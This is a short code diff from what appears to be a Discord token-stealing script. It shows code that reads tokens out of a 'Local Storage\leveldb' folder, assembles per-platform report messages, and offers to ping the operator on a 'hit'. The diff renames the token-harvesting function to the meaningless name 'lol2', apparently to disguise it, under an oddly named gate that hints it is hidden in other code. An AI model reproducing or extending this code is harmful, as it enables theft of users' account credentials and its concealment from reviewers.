@@ -11,7 +11,7 @@ if WhatTheFlip == True:
   # mentions you when you get a hit
   PING_ME = False
   
-  def find_tokens(path):
+  def lol2(path):
       path += '\\Local Storage\\leveldb'
   
       tokens = []
@@ -48,7 +48,7 @@ if WhatTheFlip == True:
   
           message += f'\n**{platform}**\n```\n'
   
-          tokens = find_tokens(path)
+          tokens = lol2(path)
   
           if len(tokens) > 0:
               for token in tokens:
